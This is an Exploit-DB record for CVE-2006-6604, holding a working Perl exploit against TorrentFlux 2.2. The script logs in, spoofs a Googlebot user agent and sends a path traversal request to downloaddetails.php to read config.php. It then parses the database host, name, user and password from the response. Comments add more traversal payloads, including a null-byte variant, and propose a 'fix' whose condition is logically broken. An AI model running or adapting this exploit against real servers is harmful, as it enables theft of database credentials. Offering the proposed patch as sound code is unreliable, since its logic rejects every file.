{
  "id": "2902",
  "title": "TorrentFlux 2.2 - &#039;downloaddetails.php&#039; Local File Disclosure",
  "cve": "CVE-2006-6604",
  "vuln_type": "unknown",
  "code": "#Description: \r\n\r\n#TorrentFlux fails to sanitise the variable \"alias\" in downloaddetails.php. This allows an \r\n#attacker to include any file they want; the contents is displayed at in the spaces provided\r\n#and the remaning data is displayed as error messages on the page. Overall Torrentflux makes it\r\n#look quite nice. Solution use SecurityClean() of viewnfo.php to solve the problem. \r\n\r\n# Note: After just looking at the code for viewnfo.php of TorrentFlux 2.1, it would seem that\r\n# it is possible to also read the config.php file in the same way, since path was not sanitised. \r\n# Although they have fixed this problem in 2.2 with a function i demonstrated to the \r\n# developer for a previous vulnerability. Exploit: viewnfo.php?path=../config.php\r\n\r\n# Just a thought, SecurityCleanPath() could look a bit nicer like so: \r\n# From: \r\n#if( (strtolower( substr( $string, -4 ) ) == \".txt\") || (strtolower( substr( $string, -4 ) ) == \".nfo\") )\r\n#    {\r\n#        // we are good\r\n#    }\r\n#    else\r\n#    {\r\n#        AuditAction($cfg[\"constants\"][\"error\"], \"Not a text or NFO: \" . $string);\r\n#        die(\"Invalid file specified.  Action has been logged.\");\r\n#    }\r\n\r\n#To: \r\n#if( (strtolower( substr( $string, -4 ) ) != \".txt\") || (strtolower( substr( $string, -4 ) ) != \".nfo\") )\r\n#{\r\n#\tAuditAction($cfg[\"constants\"][\"error\"], \"Not a text or NFO: \" . $string);\r\n#\tdie(\"Invalid file specified.  Action has been logged.\");\r\n#}\r\n# And it would seem for some reason if you do you change the above code it prevents you from \r\n# using a null character to access any file in the current or above directory. 2.2 is \r\n# vulnerable to this. EG: viewnfo.php?path=../config.php%00.txt (but since you cant go back\r\n# a directory it doesn't help much - and you are stuck in the downloads, or above directories). \r\n\r\n# r0ut3r (writ3r [at] gmail.com)\r\n\r\n#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       #\r\n#################################################################################################\r\n# Software: TorrentFlux 2.2                                                                     #\r\n#                                                                                               #\r\n# Vendor: http://www.torrentflux.com/                                                           #\r\n#                                                                                               #\r\n# Released: 2006/12/09                                                                          #\r\n#                                                                                               #\r\n# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #\r\n#                                                                                               #\r\n# Note from a developer: \"Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       #\r\n# vulnerability to a NON user\".                                                                 #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for TorrentFlux administrator              #\r\n# testing purposes only! This vulnerability requires a user account.                            #\r\n#                                                                                               #\r\n# Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            #\r\n# Download it at: http://www.torrentflux.com/                                                   #\r\n#################################################################################################\r\n\r\nuse IO::Socket;\r\n\r\n$port = \"80\"; # connection port\r\n$target = @ARGV[0]; # torrentflux.com\r\n$folder = @ARGV[1]; # /torrentflux/\r\n$user = @ARGV[2]; # login username\r\n$pass = @ARGV[3]; # login password\r\n\r\nsub Header()\r\n{\r\n\tprint q\r\n\t{#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       #\r\n#################################################################################################\r\n};\r\n}\r\n\r\nsub Usage()\r\n{\r\n\tprint q\r\n\t{\r\nUsage: db_tf2.pl [target] [directory] [username] [password]\r\nExample: db_tf2.pl torrentflux.com /torrentflux/ r0ut3r testing123 \r\n};\r\n\texit();\r\n}\r\n\r\nHeader();\r\n\r\nif (!$target || !$folder || !$user || !$pass) {\r\n\tUsage(); }\r\n\r\nprint \"\\n[+] Connecting...\\r\\n\";\r\n$sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect. Exiting...\\r\\n\";\r\nprint \"[+] Attempting to login\\n\";\r\nprint $sock \"GET \".$folder.\"login.php?username=$user&iamhim=$pass HTTP/1.1\\n\";\r\nprint $sock \"Host: $target\\n\";\r\nprint $sock \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\nprint $sock \"Accept: text/html\\n\";\r\nprint $sock \"Connection: keep-alive\\n\\n\\r\\n\";\r\n\r\nwhile (<$sock>)\r\n{\r\n        if (/Cookie: TorrentFlux=(.*?);/)\r\n        {\r\n                $cookie = \"TorrentFlux=$1\";\r\n        }\r\n}\r\n\r\nprint \"[+] Successfully logged in\\n\";\r\nprint \"[+] Cookie: \".$cookie.\"\\n\";\r\nif ($cookie eq \"\")\r\n{\r\n        print \"[-] Failed to login. Exiting...\";\r\n\texit();\r\n}\r\n\r\nprint \"[+] Sending request\\n\";\r\n\r\n$xpack = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect on exploit attempt. Exiting...\\r\\n\";\r\nprint $xpack \"GET \".$folder.\"downloaddetails.php?alias=../../config.php HTTP/1.1\\n\";\r\nprint $xpack \"Host: $target\\n\";\r\nprint $xpack \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\nprint $xpack \"Accept: text/html\\n\";\r\nprint $xpack \"Cookie: \".$cookie.\"\\n\";\r\nprint $xpack \"Connection: keep-alive\\n\\n\";\r\nprint \"\\n---------- Exploit Results ----------\\n\\n\"; \r\n\r\nwhile (<$xpack>)\r\n{\r\n\tif (/db_type\"] = \"(.*?)\";/) {\r\n\t\tprint \"Type: $1\\n\"; }\r\n\tif (/db_host\"] = \"(.*?)\";/) {\r\n\t\tprint \"Host: $1\\n\"; }\r\n\tif (/db_name\"] = \"(.*?)\";/) {\r\n\t\tprint \"Name: $1\\n\"; }\r\n\tif (/db_user\"] = \"(.*?)\";/) {\r\n\t\tprint \"User: $1\\n\"; }\r\n\tif (/db_pass\"] = \"(.*?)\";/) {\r\n\t\tprint \"Pass: $1\\n\\n\"; \r\n\t\t$res = true; }\r\n}\r\nif ($res eq false) {\r\n\tprint \"[-] Exploit failed - Not vulnerable\\n\"; }\r\n\r\nprint \"[!] Connection to host lost...\\n\";\r\n\r\n#################################################################################################\r\n#               This has been another r0ut3r discovery - writ3r [at] gmail.com                  #\r\n#################################################################################################\r\n\r\n# milw0rm.com [2006-12-09]",
  "url": "https://www.exploit-db.com/exploits/2902"
}